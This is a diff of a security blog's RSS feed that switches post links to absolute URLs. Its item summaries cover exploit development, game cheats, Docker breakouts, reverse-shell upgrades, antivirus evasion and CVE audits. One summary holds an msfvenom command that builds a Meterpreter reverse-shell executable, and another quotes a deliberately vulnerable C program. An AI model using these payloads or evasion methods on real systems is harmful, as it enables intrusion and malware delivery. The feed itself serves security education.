@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on A Blog.</title>
-    <link>/post/</link>
+    <link>https://bananamafia.dev/post/</link>
     <description>Recent content in Posts on A Blog.</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Tue, 30 Jul 2019 00:00:00 +0000</lastBuildDate>
     
-	<atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://bananamafia.dev/post/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>r2con 2019 PwnDebian Challenge: Exploiting radare2</title>
-      <link>/post/r2-pwndebian/</link>
+      <link>https://bananamafia.dev/post/r2-pwndebian/</link>
       <pubDate>Tue, 30 Jul 2019 00:00:00 +0000</pubDate>
       
-      <guid>/post/r2-pwndebian/</guid>
+      <guid>https://bananamafia.dev/post/r2-pwndebian/</guid>
       <description>Yo Yo Yo.
 Everyone knows: This years r2con, the conference about radare2, has a very special challenge &amp;ndash; PwnDebian:
 The almighty blenk92 and me decided to assist the radare2 project in finding such an exploit an we think we were quite successful :)
@@ -26,20 +26,20 @@ Shelling Out Via The r2 Shell While running r2, it&amp;rsquo;s possible to shell
     
     <item>
       <title>Buffer Overflows on x64 with radare2</title>
-      <link>/post/x64-bof/</link>
+      <link>https://bananamafia.dev/post/x64-bof/</link>
       <pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate>
       
-      <guid>/post/x64-bof/</guid>
+      <guid>https://bananamafia.dev/post/x64-bof/</guid>
       <description>The approach to exploit buffer overflows on x64 is a bit different that on x86. This post demonstrates this using the split challenge of ROP Emporium while making use of radare2.
 RIP &amp;amp; Canonical Addresses The first thing one notices when trying to gain control over the instruction pointer is that only values of a specific range are allowed to be loaded into the RIP register. On x86 arbitrary values can be loaded into the instruction pointer register (EIP) - on x64 only canonical values are allowed.</description>
     </item>
     
     <item>
       <title>Coding A CS:GO Hack</title>
-      <link>/post/bananabot/</link>
+      <link>https://bananamafia.dev/post/bananabot/</link>
       <pubDate>Wed, 19 Jun 2019 00:00:00 +0000</pubDate>
       
-      <guid>/post/bananabot/</guid>
+      <guid>https://bananamafia.dev/post/bananabot/</guid>
       <description>This post covers creating a multihack for the game Counter Strike: Global Offensive. The created hack works with the Linux version of the game - coding a windows-based hack can however be done with the same methodology and tools. Below you can find a demonstration of the finished cheat:
 The features therefore include:
  Bunnyhop Bot: Do jumps as soon as the player hits the ground to make it easier to perform bunny hop chains No Flash: Be immune to flash grenades that would block the players vision Aimbot: Automatically aim at the head of the nearest enemy  Tooling &amp;amp; Setup Linux lacks of good tools to perform the kind of analysis tasks required to code a cheat like this.</description>
@@ -47,50 +47,50 @@ The features therefore include:
     
     <item>
       <title>Bypassing ASLR and DEP for 32-Bit Binaries With r2</title>
-      <link>/post/binary-aslr-dep-32/</link>
+      <link>https://bananamafia.dev/post/binary-aslr-dep-32/</link>
       <pubDate>Wed, 01 May 2019 00:00:00 +0000</pubDate>
       
-      <guid>/post/binary-aslr-dep-32/</guid>
+      <guid>https://bananamafia.dev/post/binary-aslr-dep-32/</guid>
       <description>This post covers basic basics of bypassing ASLR and DEP with r2. For this, a vulnerable application, yolo.c, is required:
 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; void lol(char *b) { char buffer[1337]; strcpy(buffer, b); } int main(int argc, char **argv) { lol(argv[1]); }  64-Bit vs 32-Bit Binaries The issue here should be quite obvious - strcpy blindly copies the user-controlled input buffer b into buffer which causes a buffer overflow.</description>
     </item>
     
     <item>
       <title>Information Leak in Docker</title>
-      <link>/post/docker-leak/</link>
+      <link>https://bananamafia.dev/post/docker-leak/</link>
       <pubDate>Fri, 04 Jan 2019 00:00:00 +0000</pubDate>
       
-      <guid>/post/docker-leak/</guid>
+      <guid>https://bananamafia.dev/post/docker-leak/</guid>
       <description>During an assessment of the Docker platform in November 2018, two information leaks regarding the /proc/asound path were discovered in the OCI (Open Container Initiative) specification. These issues have been fixed quickly by the Docker security team using the provided suggestions.
 Leak of audio device status of the host When media is being played on the host, the /proc/asound/card*/pcm*p/sub*/status files may contain information regarding the status of media playback. Consider this command for a demonstration:</description>
     </item>
     
     <item>
       <title>Random Note #092345: Passing binary input via GDB</title>
-      <link>/post/rnd-092345-gdb/</link>
+      <link>https://bananamafia.dev/post/rnd-092345-gdb/</link>
       <pubDate>Fri, 26 Oct 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/rnd-092345-gdb/</guid>
+      <guid>https://bananamafia.dev/post/rnd-092345-gdb/</guid>
       <description>When trying to exploit an application it&amp;rsquo;s useful to send the input via gdb to immediately check how the input is being processed. But once the gdb is open it&amp;rsquo;s sometimes not clear how to pass binary input to applications reading from stdin, e.g. using read. An easy way is to start the debugging session with gdb ./binary and using
 run &amp;lt; &amp;lt;(printf &amp;quot;\xAA\xAA\xAA&amp;quot;)  from the gdb session to send arbitrary bytes.</description>
     </item>
     
     <item>
       <title>Car Hacking: A Short Overview</title>
-      <link>/post/autohax/</link>
+      <link>https://bananamafia.dev/post/autohax/</link>
       <pubDate>Tue, 23 Oct 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/autohax/</guid>
+      <guid>https://bananamafia.dev/post/autohax/</guid>
       <description>Ever wondered about the various techniques that can be applied to hack modern cars? This post documents various ways to do so - you can use it as a cheatsheet
 Software There are multiple ways one can interface with the software stack of a car. The easiest one is to use USB-to-Ethernet adapters in order to attach to the network of the car. It&amp;rsquo;s important to use special adapters that are whitelisted on the car&amp;rsquo;s head unit.</description>
     </item>
     
     <item>
       <title>Creating A Multiplayer Game Hack</title>
-      <link>/post/multihack/</link>
+      <link>https://bananamafia.dev/post/multihack/</link>
       <pubDate>Tue, 28 Aug 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/multihack/</guid>
+      <guid>https://bananamafia.dev/post/multihack/</guid>
       <description>What? This post covers creating a multihack for multiplayer games. The target is a Quake3 based game called Jedi Academy. I&amp;rsquo;ve found the techniques and process of doing this to be fairly undocumented and obscure, so this can serve as a starting point for researchers and game hackers.
 I&amp;rsquo;ve released my multihack source code. These are the implemented features:
  Wallhack (seeing enemies through walls) Player Glow (Enemies are glowing) Cheat Unlocker (Use otherwise blocked client side settings) Triggerbot (Automatically pull the trigger and shoot at enemies once they are in the crosshair)  This is what the wallhack and player glow looks like:</description>
@@ -98,29 +98,29 @@ I&amp;rsquo;ve released my multihack source code. These are the implemented feat
     
     <item>
       <title>Runtime Function Patching</title>
-      <link>/post/cvar-hax/</link>
+      <link>https://bananamafia.dev/post/cvar-hax/</link>
       <pubDate>Thu, 16 Aug 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/cvar-hax/</guid>
+      <guid>https://bananamafia.dev/post/cvar-hax/</guid>
       <description>When it comes to patching certain functions of a binary on ASM level, it&amp;rsquo;s often performed by modifying the binary itself. This post shows a different approach to accomplish the same thing: Removing game cheat protections using runtime function patching.
 The Target This is being shown in the following context: Quake3 based multiplayer games include certain settings (CVars) which are disabled for players to prevent cheating. These settings would enable clients to disable fog and shadows and use different camera angles.</description>
     </item>
     
     <item>
       <title>Random Note #632424: Backup Google Authenticator Data</title>
-      <link>/post/rnd-632424-2fa-backup/</link>
+      <link>https://bananamafia.dev/post/rnd-632424-2fa-backup/</link>
       <pubDate>Wed, 20 Jun 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/rnd-632424-2fa-backup/</guid>
+      <guid>https://bananamafia.dev/post/rnd-632424-2fa-backup/</guid>
       <description>Using 2 factor authentication generally is a good idea. However, losing 2 factor data can be the opposite. If you&amp;rsquo;re using Google Authenticator to generate 2FA codes, you may have wondered how to backup the data the app uses to generate codes. The method described here requires root access of course but doesn&amp;rsquo;t require a third party app. Please note that you can always use apps that backup app data but recovering this data on newer Android versions can fail.</description>
     </item>
     
     <item>
       <title>Docker Breakout Using X11</title>
-      <link>/post/docker-breakout/</link>
+      <link>https://bananamafia.dev/post/docker-breakout/</link>
       <pubDate>Fri, 18 May 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/docker-breakout/</guid>
+      <guid>https://bananamafia.dev/post/docker-breakout/</guid>
       <description>Use Docker to run GUI applications they said.
 Mount the X11 socket they said.
 Allow other users to access your X session they said.
@@ -131,10 +131,10 @@ The problem To display windows spawned through a Docker container, people often 
     
     <item>
       <title>Methods to Upgrade nc Reverse Shells</title>
-      <link>/post/shell-upgrade/</link>
+      <link>https://bananamafia.dev/post/shell-upgrade/</link>
       <pubDate>Wed, 16 May 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/shell-upgrade/</guid>
+      <guid>https://bananamafia.dev/post/shell-upgrade/</guid>
       <description>Ended up with a cheap nc shell and want to upgrade to a &amp;ldquo;real&amp;rdquo; shell with a proper TTY and navigation?
 Say no more &amp;lt;:
 1. Upgrading using shell magic This doesn&amp;rsquo;t always work - however if Python is present on the victims machine, it&amp;rsquo;s worth a try.
@@ -143,10 +143,10 @@ Say no more &amp;lt;:
     
     <item>
       <title>2 Common Python Security Issues</title>
-      <link>/post/python-hax/</link>
+      <link>https://bananamafia.dev/post/python-hax/</link>
       <pubDate>Sun, 13 May 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/python-hax/</guid>
+      <guid>https://bananamafia.dev/post/python-hax/</guid>
       <description>tl;dr Be aware that imports can be hijacked for Python2 and Python3 - take care of EUIDs.
 Don&amp;rsquo;t use input() for Python2.x.
 Module Hijacking When assigning SUID bits to Python scripts, privileges can be escalated easily. Consider the following Python source code:
@@ -155,10 +155,10 @@ Module Hijacking When assigning SUID bits to Python scripts, privileges can be e
     
     <item>
       <title>Cracking Music Server Software</title>
-      <link>/post/mserver-crack/</link>
+      <link>https://bananamafia.dev/post/mserver-crack/</link>
       <pubDate>Sun, 13 May 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/mserver-crack/</guid>
+      <guid>https://bananamafia.dev/post/mserver-crack/</guid>
       <description>tl;dr Generating licenses using MD5(email) is bad.
 Validating licenses using HTTP in plain text is bad.
 The Software This post covers reverse engineering and cracking the license validation process of a popular and closed source self hosted music server application. The developer has been notified about the findings, however no reply has been received. The validation issues still exist as of now and affects all issued licenses. Because of this, the name of the application won&amp;rsquo;t be disclosed.</description>
@@ -166,19 +166,19 @@ The Software This post covers reverse engineering and cracking the license valid
     
     <item>
       <title>Random Note #12354123: Easy Remote Pair Programming Using Docker and Tmux</title>
-      <link>/post/pairprog/</link>
+      <link>https://bananamafia.dev/post/pairprog/</link>
       <pubDate>Tue, 10 Apr 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/pairprog/</guid>
+      <guid>https://bananamafia.dev/post/pairprog/</guid>
       <description>Recently I&amp;rsquo;ve created a small docker container to perform remote pair programming. Shared shell sessions are an easy way to remotely interact with coworkers or other people. With additional docker magic you now don&amp;rsquo;t even have to give them access to your host system - they will be contained just like you and the work that&amp;rsquo;s being done. Using my docker image, it&amp;rsquo;s possible to share a tmux session with a group of people.</description>
     </item>
     
     <item>
       <title>Random Note #23542351: Using the GitHub API to improve Dockerfiles</title>
-      <link>/post/rnd-23542352/</link>
+      <link>https://bananamafia.dev/post/rnd-23542352/</link>
       <pubDate>Tue, 20 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/rnd-23542352/</guid>
+      <guid>https://bananamafia.dev/post/rnd-23542352/</guid>
       <description>When writing Dockerfiles, people often use something like this to download and install software from GitHub:
 ENV SOFTWARE_VERSION 1.33.7 RUN curl -sSL \ https://github.com/user/repo/releases/download/${SOFTWARE_VERSION}/amd64.deb  This can be optimized so that always the newest version gets used, which also simplifies maintaining the Dockerfile because updating happens automatically:
 curl -sSL \ $(curl -sSL https://api.github.com/repos/user/repo/releases/latest | \ grep &amp;quot;browser_download_url&amp;quot; | \ grep &amp;quot;amd64.deb&amp;quot; | \ cut -d &amp;quot;:&amp;quot; -f 2,3 | \ tr --delete \&amp;quot; | \ tr --delete &amp;quot; &amp;quot;) \ -o /tmp/software-amd64.</description>
@@ -186,10 +186,10 @@ curl -sSL \ $(curl -sSL https://api.github.com/repos/user/repo/releases/latest |
     
     <item>
       <title>A Quick Survey on Anti-Anti-Viruses</title>
-      <link>/post/crypt0r/</link>
+      <link>https://bananamafia.dev/post/crypt0r/</link>
       <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/crypt0r/</guid>
+      <guid>https://bananamafia.dev/post/crypt0r/</guid>
       <description>tl;dr AVs can easily be bypassed using malware AES crypters like Crypt0r:
 Open Source Evasion Techniques All of the following results are based on a meterpreter file which was generated like this:
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.168.1.1 LPORT=1337 -o meter.exe  All scans are performed on VirusTotal. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&amp;rsquo;t required at all.</description>
@@ -197,10 +197,10 @@ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.
     
     <item>
       <title>Monitor All the Things using Docker and Monit</title>
-      <link>/post/monit/</link>
+      <link>https://bananamafia.dev/post/monit/</link>
       <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/monit/</guid>
+      <guid>https://bananamafia.dev/post/monit/</guid>
       <description>After setting up 329423 services and 823423 containers, you might want to manage your environment in case some service fails. This can be automated restarting, getting notified about failures or a similar thing. Say no more, I&amp;rsquo;ve created a Dockerfile and image for Monit for this.
 Monit is extremely configurable and allows a maximum of flexibility when it comes to monitoring.
 Initially, a configuration file is required to get started. To get one, call</description>
@@ -208,20 +208,20 @@ Initially, a configuration file is required to get started. To get one, call</de
     
     <item>
       <title>Exploiting Unqoted Service Paths For Fun and No Profit</title>
-      <link>/post/realtek-driverutil/</link>
+      <link>https://bananamafia.dev/post/realtek-driverutil/</link>
       <pubDate>Thu, 15 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/realtek-driverutil/</guid>
+      <guid>https://bananamafia.dev/post/realtek-driverutil/</guid>
       <description>This kind of vulnerability is really old. However, vendors still fail to properly address this issue. This is just another example of exploiting this kind of vulnerability on Windows 10 with the most up-to-date ALFA AWUS036AC driver utility (version 1030.6). Note that the download link points to alfa.com but the driver utility itself says it&amp;rsquo;s developed by REALTEK.
 The vulnerability Upon installing the driver utility, two vulnerable services get installed.</description>
     </item>
     
     <item>
       <title>Easy and Secure Backups Using Borg and Docker</title>
-      <link>/post/docker-borg/</link>
+      <link>https://bananamafia.dev/post/docker-borg/</link>
       <pubDate>Wed, 14 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/docker-borg/</guid>
+      <guid>https://bananamafia.dev/post/docker-borg/</guid>
       <description>BorgBackup is a secure backup solution which is also easy to use. It provides compression, encryption, deduplication and authentication.
 Getting started I&amp;rsquo;ve created a Dockerfile based on Alpine Linux which is also available on DockerHub. It gets built weekly to always stay up to date.
 This Makefile can be used to quickly get started using a containerized version of Borg:
@@ -230,29 +230,29 @@ SHELL := /bin/bash VERSION ?= latest # The directory of this file DIR := $(shell
     
     <item>
       <title>Automated and Tested Dotfile Deployment Using Ansible and Docker</title>
-      <link>/post/dotfile-deployment/</link>
+      <link>https://bananamafia.dev/post/dotfile-deployment/</link>
       <pubDate>Thu, 08 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/dotfile-deployment/</guid>
+      <guid>https://bananamafia.dev/post/dotfile-deployment/</guid>
       <description>This is the second part of my posts about Dotfile management. Part one can be found here.
 After spending a lot of time and effort on your Dotfiles, it may be useful to setup an automated deployment process. There are existing solutions like GNU Stow, but for maximum flexibility the use of Ansible may be a better option. Using this, files and advanced configuration hierarchies can be distributed easily. This post covers my personal setup, which also includes an automated deployment test approach for multiple linux distributions.</description>
     </item>
     
     <item>
       <title>Using Shellcheck and Docker to Automatically Lint Dotfiles</title>
-      <link>/post/dotfile-shellcheck/</link>
+      <link>https://bananamafia.dev/post/dotfile-shellcheck/</link>
       <pubDate>Thu, 08 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/dotfile-shellcheck/</guid>
+      <guid>https://bananamafia.dev/post/dotfile-shellcheck/</guid>
       <description>In order to prevent errors and side effects, it&amp;rsquo;s useful to use Shellcheck to lint all shell scripts. While checking out the Dotfiles of jessfraz, I came across an easy way to integrate this kind of check with Travis CI. The mentioned approach triggers a travis linting process after pushing to to the Dotfiles repository on GitHub. This post will explain all necessary steps to integrate this process into your own repository.</description>
     </item>
     
     <item>
       <title>Universal Notifications Using Telegram and cURL</title>
-      <link>/post/telegram-notifications/</link>
+      <link>https://bananamafia.dev/post/telegram-notifications/</link>
       <pubDate>Wed, 07 Mar 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/telegram-notifications/</guid>
+      <guid>https://bananamafia.dev/post/telegram-notifications/</guid>
       <description>If you ever wanted to get notified when certain things happen but didn&amp;rsquo;t find a lightweight solution &amp;ndash; here comes captain Telegram.
 Using a simple Telegram bot, it&amp;rsquo;s possible to send notifications to your mobile phone or browser. All the notifier node needs is curl installed.
 Registering a bot First of all, a Telegram bot has to be registered in order to send messages later on. Follow these steps to get started:</description>
@@ -260,10 +260,10 @@ Registering a bot First of all, a Telegram bot has to be registered in order to 
     
     <item>
       <title>Building a CI Docker Pipeline Using Docker in Your Docker</title>
-      <link>/post/docker-jenkins/</link>
+      <link>https://bananamafia.dev/post/docker-jenkins/</link>
       <pubDate>Mon, 15 Jan 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/docker-jenkins/</guid>
+      <guid>https://bananamafia.dev/post/docker-jenkins/</guid>
       <description>Note: This isn&amp;rsquo;t up to date anymore, instead use img .
 First of all – why should you want to build all the docker images on your own build server?
  Complete control over the build process You know when the images are built and how up-to-date they are Use of private repositories and images Because you can  This assumes that you already have control over a private docker registry.</description>
@@ -271,10 +271,10 @@ First of all – why should you want to build all the docker images on your own 
     
     <item>
       <title>Auditing the Oral-B App (v5.0.0) (1 CVE)</title>
-      <link>/post/oral-b/</link>
+      <link>https://bananamafia.dev/post/oral-b/</link>
       <pubDate>Mon, 08 Jan 2018 00:00:00 +0000</pubDate>
       
-      <guid>/post/oral-b/</guid>
+      <guid>https://bananamafia.dev/post/oral-b/</guid>
       <description>Upon assessing the Oral-B app (com.pg.oralb.oralbapp), the following findings have been made:
 CVE-2018-5298: Hardcoded AES Parameters Guess what, hardcoded AES parameters:
 These parameters are stored in the class OralBApplication and also get used there:
@@ -284,10 +284,10 @@ Because of the static key, an attacker can gain access to user data more easily 
     
     <item>
       <title>Auditing NQ Contacts Backup &amp; Restore 1.1 (3 CVEs)</title>
-      <link>/post/nq-contactsbackup/</link>
+      <link>https://bananamafia.dev/post/nq-contactsbackup/</link>
       <pubDate>Sun, 29 Oct 2017 00:00:00 +0000</pubDate>
       
-      <guid>/post/nq-contactsbackup/</guid>
+      <guid>https://bananamafia.dev/post/nq-contactsbackup/</guid>
       <description>NQ Contacts Backup &amp;amp; Restore is an android app that allows users to backup and restore contact data (as vcard) to/from the remote NQ server. For the audit, the android app was the primary target.
 Note: The app shares its code base with NQ Mobile Security &amp;amp; Anti Virus - hence the odd class names for a simple contact backup app.
 CVE-2017-15999: Lack of HTTPS usage When logging in or transmitting data, the app communicates with the remote server via HTTP.</description>
@@ -295,10 +295,10 @@ CVE-2017-15999: Lack of HTTPS usage When logging in or transmitting data, the ap
     
     <item>
       <title>Auditing WriteDiary.com (2 CVEs) </title>
-      <link>/post/write-diary/</link>
+      <link>https://bananamafia.dev/post/write-diary/</link>
       <pubDate>Fri, 27 Oct 2017 00:00:00 +0000</pubDate>
       
-      <guid>/post/write-diary/</guid>
+      <guid>https://bananamafia.dev/post/write-diary/</guid>
       <description>General note: The developer and owner of both the webapp and android app has been contacted multiple times to develop a quick fix for the issues addressed in this blog post and a vulnerability concerning the webapp which isn&amp;rsquo;t described here. However, no response has been received.
 WriteDiary consists of a webapp and an Android app (version 4.72). For the audit, the android app was the primary target.
 CVE-2017-15581: Lack of HTTPS-usage, lack of user data encryption when transmitting In the &amp;ldquo;Diary with lock&amp;rdquo; (aka WriteDiary) application 4.</description>
